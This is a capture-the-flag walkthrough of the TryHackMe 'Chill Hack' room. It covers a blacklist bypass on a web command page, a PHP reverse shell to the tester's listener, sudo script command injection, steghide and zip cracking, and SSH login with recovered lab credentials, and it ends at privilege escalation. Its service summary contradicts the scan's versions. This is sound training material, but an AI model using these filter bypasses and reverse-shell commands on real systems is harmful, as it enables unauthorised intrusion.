# Chill Hack

- [Room information](#room-information)
- [Solution](#solution)
- [References](#references)

## Room information

```text
Type: Challenge
Difficulty: Easy
Tags: Linux, Web
Subscription type: Free
Description:
Easy level CTF. Capture the flags and have fun!
```

Room link: [https://tryhackme.com/room/chillhack](https://tryhackme.com/room/chillhack)

## Solution

### Check for services with nmap

We start by scanning the machine with `nmap` including service info and default scripts

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Chill_Hack]
└─$ export TARGET_IP=10.67.160.117

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Chill_Hack]
└─$ sudo nmap -sV -sC $TARGET_IP
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-10 15:00 CET
Nmap scan report for 10.67.160.117
Host is up (0.12s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.141.248
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ff:35:7d:5f:38:0b:14:ec:f2:5a:67:f2:63:b7:3b:ce (RSA)
|   256 71:27:11:bd:be:d8:b9:4d:fc:b3:82:98:43:d8:f6:98 (ECDSA)
|_  256 77:3e:63:2f:ce:b8:61:fc:68:d0:52:e5:b8:7a:e7:77 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Game Info
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.31 seconds
```

We have three services running:

- vsftpd 3.0.2 running on port 21
- OpenSSH 6.7p1 running on port 22
- Apache httpd running on port 80

### Enumerate the FTP service

Next, we check for interesting files on the FTP server

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Chill_Hack]
└─$ ftp anonymous@$TARGET_IP    
Connected to 10.67.160.117.
220 (vsFTPd 3.0.5)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||44076|)
150 Here comes the directory listing.
-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
226 Directory send OK.
ftp> ascii
200 Switching to ASCII mode.
ftp> mget *.txt
mget note.txt [anpqy?]? y
229 Entering Extended Passive Mode (|||25597|)
150 Opening BINARY mode data connection for note.txt (90 bytes).
100% |****************************************************************************************************************************************************************|    90        1.08 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 1 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
90 bytes received in 00:00 (0.43 KiB/s)
ftp> quit
221 Goodbye.

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Chill_Hack]
└─$ cat note.txt                     
Anurodh told me that there is some filtering on strings being put in the command -- Apaar
```

Not sure what to do with that note (yet)...

### Analyse the web server

Manually browsing to port 80 shows a `Game info` site

![Web Page on Chill Hack](Images/Web_Page_on_Chill_Hack.png)

No special functionality was found when checking the site by clicking around.

Checking for interesting files and directories with `gobuster` we find

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Chill_Hack]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r -t 32 -x php,txt,html -u http://$TARGET_IP
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.67.160.117
[+] Method:                  GET
[+] Threads:                 32
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 35184]
/.html                (Status: 403) [Size: 278]
/images               (Status: 200) [Size: 16282]
/about.html           (Status: 200) [Size: 21339]
/contact.html         (Status: 200) [Size: 18301]
/contact.php          (Status: 200) [Size: 0]
/blog.html            (Status: 200) [Size: 30279]
/news.html            (Status: 200) [Size: 19718]
/css                  (Status: 200) [Size: 4334]
/team.html            (Status: 200) [Size: 19868]
/js                   (Status: 200) [Size: 3379]
/fonts                (Status: 200) [Size: 4763]
/secret               (Status: 200) [Size: 168]
/.php                 (Status: 403) [Size: 278]
/.html                (Status: 403) [Size: 278]
/server-status        (Status: 403) [Size: 278]
Progress: 882240 / 882244 (100.00%)
===============================================================
Finished
===============================================================
```

The `/secret` directory sounds promising and turns out to be a webshell-like page where you can execute commands like `id`

![Webshell on Chill Hack](Images/Webshell_on_Chill_Hack.png)

However, checking for the presence of netcat with `which nc` triggers an alert

![Webshell on Chill Hack 2](Images/Webshell_on_Chill_Hack_2.png)

And now the note we found on the FTP-server is starting to make sense.

Even simple commands like `ls` triggers an alert.

Some trial-and-error testing with different commands gives us the following:

- With `id` we know that we are running as `uid=33(www-data) gid=33(www-data) groups=33(www-data)`
- With `pwd` we can get the current directory which is `/var/www/html/secret`
- With `echo *` we can list the files in the current directory which are `index.php`
- With `grep black index.php` we can get the list of black listed commands which is `$blacklist = array('nc', 'python', 'bash','php','perl','rm','cat','head','tail','python3','more','less','sh','ls');`

We can also do a manual PHP base64-filter wrapper-like trick by entering the command `base64 index.php` and later decode the output

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Chill_Hack]
└─$ echo 'PGh0bWw+Cjxib2R5PgoKPGZvcm0gbWV0aG9kPSJQT1NUIj4KICAgICAgICA8aW5wdXQgaWQ9ImNv bW0iIHR5cGU9InRleHQiIG5hbWU9ImNvbW1hbmQiIHBsYWNlaG9sZGVyPSJDb21tYW5kIj4KICAg ICAgICA8YnV0dG9uPkV4ZWN1dGU8L2J1dHRvbj4KPC9mb3JtPgo8P3BocAogICAgICAgIGlmKGlz c2V0KCRfUE9TVFsnY29tbWFuZCddKSkKICAgICAgICB7CiAgICAgICAgICAgICAgICAkY21kID0g JF9QT1NUWydjb21tYW5kJ107CiAgICAgICAgICAgICAgICAkc3RvcmUgPSBleHBsb2RlKCIgIiwk Y21kKTsKICAgICAgICAgICAgICAgICRibGFja2xpc3QgPSBhcnJheSgnbmMnLCAncHl0aG9uJywg J2Jhc2gnLCdwaHAnLCdwZXJsJywncm0nLCdjYXQnLCdoZWFkJywndGFpbCcsJ3B5dGhvbjMnLCdt b3JlJywnbGVzcycsJ3NoJywnbHMnKTsKICAgICAgICAgICAgICAgIGZvcigkaT0wOyAkaTxjb3Vu dCgkc3RvcmUpOyAkaSsrKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAg ICBmb3IoJGo9MDsgJGo8Y291bnQoJGJsYWNrbGlzdCk7ICRqKyspCiAgICAgICAgICAgICAgICAg ICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZigkc3RvcmVbJGldID09 ICRibGFja2xpc3RbJGpdKQoJCQkJez8+CgkJCQkJPGgxIHN0eWxlPSJjb2xvcjpyZWQ7Ij5BcmUg eW91IGEgaGFja2VyPzwvaDE+CgkJCQkJPHN0eWxlPgoJCQkJCQlib2R5CgkJCQkJCXsKCQkJCQkJ CWJhY2tncm91bmQtaW1hZ2U6IHVybCgnaW1hZ2VzL0ZhaWxpbmdNaXNlcmFibGVFd2Utc2l6ZV9y ZXN0cmljdGVkLmdpZicpOwoJCQkJCQkJYmFja2dyb3VuZC1wb3NpdGlvbjogY2VudGVyIGNlbnRl cjsKICAJCQkJCQkJYmFja2dyb3VuZC1yZXBlYXQ6IG5vLXJlcGVhdDsKICAJCQkJCQkJYmFja2dy b3VuZC1hdHRhY2htZW50OiBmaXhlZDsKICAJCQkJCQkJYmFja2dyb3VuZC1zaXplOiBjb3ZlcjsJ CQkJCQoJfQkKCQkJCQk8L3N0eWxlPgo8P3BocAkJCQkJIHJldHVybjsKCQkJCX0KICAgICAgICAg ICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQoJCT8+PGgyIHN0eWxlPSJjb2xvcjpi bHVlOyI+PD9waHAgZWNobyBzaGVsbF9leGVjKCRjbWQpOz8+PC9oMj4KCQkJPHN0eWxlPgogICAg ICAgICAgICAgICAgICAgICAgICAgICAgIGJvZHkKICAgICAgICAgICAgICAgICAgICAgICAgICAg ICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYmFja2dyb3VuZC1pbWFnZTog dXJsKCdpbWFnZXMvYmx1ZV9ib3lfdHlwaW5nX25vdGhvdWdodC5naWYnKTsgIAoJCQkJICAgYmFj a2dyb3VuZC1wb3NpdGlvbjogY2VudGVyIGNlbnRlcjsKICAJCQkJICAgYmFja2dyb3VuZC1yZXBl YXQ6IG5vLXJlcGVhdDsKICAJCQkJICAgYmFja2dyb3VuZC1hdHRhY2htZW50OiBmaXhlZDsKICAJ CQkJICAgYmFja2dyb3VuZC1zaXplOiBjb3ZlcjsKfQogICAgICAgICAgICAgICAgICAgICAgICAg IDwvc3R5bGU+Cgk8P3BocCB9Cj8+CjwvYm9keT4KPC9odG1sPgo=' | base64 -d -i
<html>
<body>

<form method="POST">
        <input id="comm" type="text" name="command" placeholder="Command">
        <button>Execute</button>
</form>
<?php
        if(isset($_POST['command']))
        {
                $cmd = $_POST['command'];
                $store = explode(" ",$cmd);
                $blacklist = array('nc', 'python', 'bash','php','perl','rm','cat','head','tail','python3','more','less','sh','ls');
                for($i=0; $i<count($store); $i++)
                {
                        for($j=0; $j<count($blacklist); $j++)
                        {
                                if($store[$i] == $blacklist[$j])
                                {?>
                                        <h1 style="color:red;">Are you a hacker?</h1>
                                        <style>
                                                body
                                                {
                                                        background-image: url('images/FailingMiserableEwe-size_restricted.gif');
                                                        background-position: center center;
                                                        background-repeat: no-repeat;
                                                        background-attachment: fixed;
                                                        background-size: cover;
        }
                                        </style>
<?php                                    return;
                                }
                        }
                }
                ?><h2 style="color:blue;"><?php echo shell_exec($cmd);?></h2>
                        <style>
                             body
                             {
                                   background-image: url('images/blue_boy_typing_nothought.gif');  
                                   background-position: center center;
                                   background-repeat: no-repeat;
                                   background-attachment: fixed;
                                   background-size: cover;
}
                          </style>
        <?php }
?>
</body>
</html>
```

to get the full source code of the `index.php` file.

We can also bypass the blacklisted commands by quoting individual characters like `p\hp --version` to run PHP-commands.

### Get a reverse shell

Next, we want to get a reverse shell and first we create a netcat listener

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Chill_Hack]
└─$ nc -lvnp 12345
listening on [any] 12345 ...

```

And then we execute the command `p\hp -r '$sock=fsockopen("192.168.141.248",12345);exec("bash <&3 >&3 2>&3");'`

Back at our netcat listener we now have a connection

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Chill_Hack]
└─$ nc -lvnp 12345
listening on [any] 12345 ...
connect to [192.168.141.248] from (UNKNOWN) [10.67.160.117] 54556
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Then we upgrade our shell to a proper TTY shell

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@ip-10-67-160-117:/var/www/html/secret$ ^Z
zsh: suspended  nc -lvnp 12345

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Chill_Hack]
└─$ stty raw -echo ; fg ; reset
[1]  + continued  nc -lvnp 12345

www-data@ip-10-67-160-117:/var/www/html/secret$ export SHELL=bash
www-data@ip-10-67-160-117:/var/www/html/secret$ stty rows 200 columns 200
www-data@ip-10-67-160-117:/var/www/html/secret$ ^C
www-data@ip-10-67-160-117:/var/www/html/secret$ 
```

### Get the User Flag

Now we can start searching for the user flag

```bash
www-data@ip-10-67-160-117:/var/www/html/secret$ find / -type f -name user.txt 2>/dev/null
www-data@ip-10-67-160-117:/var/www/html/secret$ 
```

Hhm, either we don't have permissions to read it or the flag is named something else.

Let's search specifically in the `/home` directory

```bash
www-data@ip-10-67-160-117:/var/www/html$ cd /home
www-data@ip-10-67-160-117:/home$ ls -la
total 24
drwxr-xr-x  6 root    root    4096 Jan 10 14:00 .
drwxr-xr-x 24 root    root    4096 Jan 10 14:00 ..
drwxr-x---  2 anurodh anurodh 4096 Oct  4  2020 anurodh
drwxr-xr-x  5 apaar   apaar   4096 Oct  4  2020 apaar
drwxr-x---  4 aurick  aurick  4096 Oct  3  2020 aurick
drwxr-xr-x  3 ubuntu  ubuntu  4096 Jan 10 14:00 ubuntu
www-data@ip-10-67-160-117:/home$ ls -laR  
.:
total 24
drwxr-xr-x  6 root    root    4096 Jan 10 14:00 .
drwxr-xr-x 24 root    root    4096 Jan 10 14:00 ..
drwxr-x---  2 anurodh anurodh 4096 Oct  4  2020 anurodh
drwxr-xr-x  5 apaar   apaar   4096 Oct  4  2020 apaar
drwxr-x---  4 aurick  aurick  4096 Oct  3  2020 aurick
drwxr-xr-x  3 ubuntu  ubuntu  4096 Jan 10 14:00 ubuntu
ls: cannot open directory './anurodh': Permission denied

./apaar:
total 44
drwxr-xr-x 5 apaar apaar 4096 Oct  4  2020 .
drwxr-xr-x 6 root  root  4096 Jan 10 14:00 ..
-rw------- 1 apaar apaar    0 Oct  4  2020 .bash_history
-rw-r--r-- 1 apaar apaar  220 Oct  3  2020 .bash_logout
-rw-r--r-- 1 apaar apaar 3771 Oct  3  2020 .bashrc
drwx------ 2 apaar apaar 4096 Oct  3  2020 .cache
drwx------ 3 apaar apaar 4096 Oct  3  2020 .gnupg
-rwxrwxr-x 1 apaar apaar  286 Oct  4  2020 .helpline.sh
-rw-r--r-- 1 apaar apaar  807 Oct  3  2020 .profile
drwxr-xr-x 2 apaar apaar 4096 Oct  3  2020 .ssh
-rw------- 1 apaar apaar  817 Oct  3  2020 .viminfo
-rw-rw---- 1 apaar apaar   46 Oct  4  2020 local.txt
ls: cannot open directory './apaar/.cache': Permission denied
ls: cannot open directory './apaar/.gnupg': Permission denied

./apaar/.ssh:
total 12
drwxr-xr-x 2 apaar apaar 4096 Oct  3  2020 .
drwxr-xr-x 5 apaar apaar 4096 Oct  4  2020 ..
-rw-r--r-- 1 apaar apaar  565 Oct  3  2020 authorized_keys
ls: cannot open directory './aurick': Permission denied

./ubuntu:
total 24
drwxr-xr-x 3 ubuntu ubuntu 4096 Jan 10 14:00 .
drwxr-xr-x 6 root   root   4096 Jan 10 14:00 ..
-rw-r--r-- 1 ubuntu ubuntu  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 ubuntu ubuntu 3771 Apr  4  2018 .bashrc
-rw-r--r-- 1 ubuntu ubuntu  807 Apr  4  2018 .profile
drwx------ 2 ubuntu ubuntu 4096 Jan 10 14:00 .ssh
ls: cannot open directory './ubuntu/.ssh': Permission denied
www-data@ip-10-67-160-117:/home$ 
```

Ah, a `local.txt` file in the `/home/apaar`directory. That sounds promising.

```bash
www-data@ip-10-67-160-117:/home$ cat /home/apaar/local.txt 
cat: /home/apaar/local.txt: Permission denied
www-data@ip-10-67-160-117:/home$ 
```

But we don't have access to it (yet).

Looking more closely on the files in the `/home/apaar` directory we find this script

```bash
www-data@ip-10-67-160-117:/home/apaar$ cat .helpline.sh 
#!/bin/bash

echo
echo "Welcome to helpdesk. Feel free to talk to anyone at any time!"
echo

read -p "Enter the person whom you want to talk with: " person

read -p "Hello user! I am $person,  Please enter your message: " msg

$msg 2>/dev/null

echo "Thank you for your precious time!"
www-data@ip-10-67-160-117:/home/apaar$ 
```

We see that the entered `msg` gets executed but the output gets redirected to `/dev/null`.  
But we can bypass the redirection but entering `#` at the end of our input to make the rest of the line a comment.

And we can run this command as `apaar` with `sudo`

```bash
www-data@ip-10-67-160-117:/home/apaar$ sudo -l
Matching Defaults entries for www-data on ip-10-67-160-117:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-67-160-117:
    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
www-data@ip-10-67-160-117:/home/apaar$ 
```

Now we can get the user flag as follows

```bash
www-data@ip-10-67-160-117:/home/apaar$ sudo -u apaar /home/apaar/.helpline.sh 

Welcome to helpdesk. Feel free to talk to anyone at any time!

Enter the person whom you want to talk with: test
Hello user! I am test,  Please enter your message: cat local.txt #
{USER-FLAG: <REDACTED>}
Thank you for your precious time!
www-data@ip-10-67-160-117:/home/apaar$ 
```

Note that you need to call the script with the full path!

Answer: `{USER-FLAG: <REDACTED>}`

### Get a shell as apaar

We can also get a shell as `apaar` like this

```bash
www-data@ip-10-67-160-117:/home/apaar$ sudo -u apaar /home/apaar/.helpline.sh 

Welcome to helpdesk. Feel free to talk to anyone at any time!

Enter the person whom you want to talk with: test
Hello user! I am test,  Please enter your message: /bin/bash
id
uid=1001(apaar) gid=1001(apaar) groups=1001(apaar)
python3 -c 'import pty;pty.spawn("/bin/bash")'
apaar@ip-10-67-160-117:~$ 
```

### Enumeration of the web files

Now we go back to the web files for some further enumeration

```bash
apaar@ip-10-67-160-117:~$ cd /var/www
apaar@ip-10-67-160-117:/var/www$ ls -la
total 16
drwxr-xr-x  4 root root 4096 Oct  3  2020 .
drwxr-xr-x 14 root root 4096 Oct  3  2020 ..
drwxr-xr-x  3 root root 4096 Oct  3  2020 files
drwxr-xr-x  8 root root 4096 Oct  3  2020 html
apaar@ip-10-67-160-117:/var/www$ cd files
apaar@ip-10-67-160-117:/var/www/files$ ls -la
total 28
drwxr-xr-x 3 root root 4096 Oct  3  2020 .
drwxr-xr-x 4 root root 4096 Oct  3  2020 ..
-rw-r--r-- 1 root root  391 Oct  3  2020 account.php
-rw-r--r-- 1 root root  453 Oct  3  2020 hacker.php
drwxr-xr-x 2 root root 4096 Oct  3  2020 images
-rw-r--r-- 1 root root 1153 Oct  3  2020 index.php
-rw-r--r-- 1 root root  545 Oct  3  2020 style.css
```

We have some PHP-files to check

```bash
apaar@ip-10-67-160-117:/var/www/files$ cat account.php 
<?php

class Account
{
        public function __construct($con)
        {
                $this->con = $con;
        }
        public function login($un,$pw)
        {
                $pw = hash("md5",$pw);
                $query = $this->con->prepare("SELECT * FROM users WHERE username='$un' AND password='$pw'");
                $query->execute();
                if($query->rowCount() >= 1)
                {
                        return true;
                }?>
                <h1 style="color:red";>Invalid username or password</h1>
        <?php }
}

?>
apaar@ip-10-67-160-117:/var/www/files$ cat hacker.php 
<html>
<head>
<body>
<style>
body {
  background-image: url('images/002d7e638fb463fb7a266f5ffc7ac47d.gif');
}
h2
{
        color:red;
        font-weight: bold;
}
h1
{
        color: yellow;
        font-weight: bold;
}
</style>
<center>
        <img src = "images/hacker-with-laptop_23-2147985341.jpg"><br>
        <h1 style="background-color:red;">You have reached this far. </h2>
        <h1 style="background-color:black;">Look in the dark! You will find your answer</h1>
</center>
</head>
</html>
```

Two rather specific images files in another directory. That's a bit weird!

### Download and investigate the images

Let's share the two image files via HTTP

```bash
apaar@ip-10-67-160-117:/var/www/files$ cd images
apaar@ip-10-67-160-117:/var/www/files/images$ ls -l
total 2104
-rw-r--r-- 1 root root 2083694 Oct  3  2020 002d7e638fb463fb7a266f5ffc7ac47d.gif
-rw-r--r-- 1 root root   68841 Oct  3  2020 hacker-with-laptop_23-2147985341.jpg
apaar@ip-10-67-160-117:/var/www/files/images$ python -m http.server 8000

Command 'python' not found, did you mean:

  command 'python3' from deb python3
  command 'python' from deb python-is-python3

apaar@ip-10-67-160-117:/var/www/files/images$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

```

so we can download them to our Kali machine for investigation

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Chill_Hack]
└─$ wget http://$TARGET_IP:8000/002d7e638fb463fb7a266f5ffc7ac47d.gif
--2026-01-10 17:23:11--  http://10.67.160.117:8000/002d7e638fb463fb7a266f5ffc7ac47d.gif
Connecting to 10.67.160.117:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2083694 (2.0M) [image/gif]
Saving to: ‘002d7e638fb463fb7a266f5ffc7ac47d.gif’

002d7e638fb463fb7a266f5ffc7ac47d.gif                100%[================================================================================================================>]   1.99M  2.13MB/s    in 0.9s    

2026-01-10 17:23:12 (2.13 MB/s) - ‘002d7e638fb463fb7a266f5ffc7ac47d.gif’ saved [2083694/2083694]


┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Chill_Hack]
└─$ wget http://$TARGET_IP:8000/hacker-with-laptop_23-2147985341.jpg
--2026-01-10 17:24:00--  http://10.67.160.117:8000/hacker-with-laptop_23-2147985341.jpg
Connecting to 10.67.160.117:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 68841 (67K) [image/jpeg]
Saving to: ‘hacker-with-laptop_23-2147985341.jpg’

hacker-with-laptop_23-2147985341.jpg                100%[================================================================================================================>]  67.23K   227KB/s    in 0.3s    

2026-01-10 17:24:00 (227 KB/s) - ‘hacker-with-laptop_23-2147985341.jpg’ saved [68841/68841]

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Chill_Hack]
└─$ file *                                            
002d7e638fb463fb7a266f5ffc7ac47d.gif: GIF image data, version 89a, 500 x 281
hacker-with-laptop_23-2147985341.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 300x300, segment length 16, baseline, precision 8, 626x417, components 3
note.txt:                             ASCII text
```

Let's check for files hidden and embedded with [steganography](https://en.wikipedia.org/wiki/Steganography)

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Chill_Hack]
└─$ steghide info hacker-with-laptop_23-2147985341.jpg 
"hacker-with-laptop_23-2147985341.jpg":
  format: jpeg
  capacity: 3.6 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "backup.zip":
    size: 750.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Chill_Hack]
└─$ steghide extract -sf hacker-with-laptop_23-2147985341.jpg
Enter passphrase: 
wrote extracted data to "backup.zip".
```

Nothing (a blank password) was used here, but that didn't work on the Zip file.

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Chill_Hack]
└─$ unzip backup.zip 
Archive:  backup.zip
[backup.zip] source_code.php password: 
   skipping: source_code.php         incorrect password
```

### Crack the password for the Zip file

Maybe we need to crack the password with John the Ripper?

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Chill_Hack]
└─$ zip2john backup.zip   
ver 2.0 efh 5455 efh 7875 backup.zip/source_code.php PKZIP Encr: TS_chk, cmplen=554, decmplen=1211, crc=69DC82F3 ts=2297 cs=2297 type=8
backup.zip/source_code.php:$pkzip$1*1*2*0*22a*4bb*69dc82f3*0*49*8*22a*2297*8e9e8de3a4b82cc98077a470ef800ed60ec6e205dc091547387432378de4c26ae8d64051a19d86bff2247f62dc1224ee79f048927d372bc6a45c0f21753a7b6beecfa0c847126d88084e57ddb9c90e9b0ef8018845c7d82b97b438a0a76e9a39c4846a146ae06efe4027f733ab63b509a56e2dec4c1dbce84337f0816421790246c983540c6fab21dd43aeda16d91addc5845dd18a05352ca9f4fcb45f0135be428c84dbac5a8d0c1fb2e84a7151ec3c1ae9740a84f2979d79da2e20d4854ef4483356cd078099725b5e7cf475144b22c64464a85edb8984cf7fc41d6a177f172c65e57f064700b6d49ef8298d83f42145e69befeab92453bd5f89bf827cd7993c9497eb2ad9868abd34b7a7b85f8e67404e2085de966e1460ad0ea031f895c7da70edbe7b7d6641dcdf6a4a31abc8781292a57b047a1cc5ce5ab4f375acf9a2ff4cac0075aa49e92f2d22e779bf3d9eacd2e1beffef894bc67de7235db962c80bbd3e3b54a14512a47841140e162184ca5d5d0ba013c1eaaa3220d82a53959a3e7d94fb5fa3ef3dfc049bdbd186851a1e7a8f344772155e569a5fa12659f482f4591198178600bb1290324b669d645dbb40dad2e52bf2adc2a55483837a5fc847f5ff0298fd47b139ce2d87915d688f09d8d167470db22bda770ce1602d6d2681b3973c5aac3b03258900d9e2cc50b8cea614d81bcfbb05d510638816743d125a0dce3459c29c996a5fdc66476f1b4280ac3f4f28ed1dbff48ef9f24fc028acc1393d07233d0181a6e3*$/pkzip$:source_code.php:backup.zip::backup.zip

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Chill_Hack]
└─$ zip2john backup.zip > backup_hash.txt
ver 2.0 efh 5455 efh 7875 backup.zip/source_code.php PKZIP Encr: TS_chk, cmplen=554, decmplen=1211, crc=69DC82F3 ts=2297 cs=2297 type=8

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Chill_Hack]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt backup_hash.txt                           
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
pass1word        (backup.zip/source_code.php)     
1g 0:00:00:00 DONE (2026-01-10 17:33) 10.00g/s 163840p/s 163840c/s 163840C/s 123456..cocoliso
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

So the password for the Zip file is `pass1word`.

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Chill_Hack]
└─$ unzip backup.zip
Archive:  backup.zip
[backup.zip] source_code.php password: 
  inflating: source_code.php         

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Chill_Hack]
└─$ cat source_code.php 
<html>
<head>
        Admin Portal
</head>
        <title> Site Under Development ... </title>
        <body>
                <form method="POST">
                        Username: <input type="text" name="name" placeholder="username"><br><br>
                        Email: <input type="email" name="email" placeholder="email"><br><br>
                        Password: <input type="password" name="password" placeholder="password">
                        <input type="submit" name="submit" value="Submit"> 
                </form>
<?php
        if(isset($_POST['submit']))
        {
                $email = $_POST["email"];
                $password = $_POST["password"];
                if(base64_encode($password) == "IWQwbnRLbjB3bVlwQHNzdzByZA==")
                { 
                        $random = rand(1000,9999);?><br><br><br>
                        <form method="POST">
                                Enter the OTP: <input type="number" name="otp">
                                <input type="submit" name="submitOtp" value="Submit">
                        </form>
                <?php   mail($email,"OTP for authentication",$random);
                        if(isset($_POST["submitOtp"]))
                                {
                                        $otp = $_POST["otp"];
                                        if($otp == $random)
                                        {
                                                echo "Welcome Anurodh!";
                                                header("Location: authenticated.php");
                                        }
                                        else
                                        {
                                                echo "Invalid OTP";
                                        }
                                }
                }
                else
                {
                        echo "Invalid Username or Password";
                }
        }
?>
</html>
```

We have a Base64-encoded password (`IWQwbnRLbjB3bVlwQHNzdzByZA==`) that we can decode

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Chill_Hack]
└─$ echo 'IWQwbnRLbjB3bVlwQHNzdzByZA==' | base64 -d
!d0ntKn0wmYp@ssw0rd  
```

OK, this is hopefully a password that works for SSH. But for what user?

Looking through the code again, we see that it is likely the `anurodh` user

```php
                        {
                           echo "Welcome Anurodh!";
                            header("Location: authenticated.php");
                        }
```

### Connect as anurodh with SSH

Let's see if we can connect as `anurodh` with the password `!d0ntKn0wmYp@ssw0rd` via SSH

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Chill_Hack]
└─$ ssh anurodh@$TARGET_IP                                   
The authenticity of host '10.67.160.117 (10.67.160.117)' can't be established.
ED25519 key fingerprint is SHA256:/xK28fZ1A2Kyqsx8TJXEqI7oLumJv27g4YegQjyRnxk.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.67.160.117' (ED25519) to the list of known hosts.
anurodh@10.67.160.117's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-138-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat 10 Jan 2026 04:43:33 PM UTC

  System load:  0.0                Processes:             130
  Usage of /:   35.1% of 18.53GB   Users logged in:       0
  Memory usage: 45%                IPv4 address for eth0: 10.67.160.117
  Swap usage:   0%


Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

Enable ESM Infra to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

Your Hardware Enablement Stack (HWE) is supported until April 2025.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

anurodh@ip-10-67-160-117:~$ 
```

And that we can!

### Privilege escalation

Next, we try to find ways to escalate our privileges. We start by re-checking `sudo`

```bash
anurodh@ip-10-67-160-117:~$ sudo -l
Matching Defaults entries for anurodh on ip-10-67-160-117:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User anurodh may run the following commands on ip-10-67-160-117:
    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
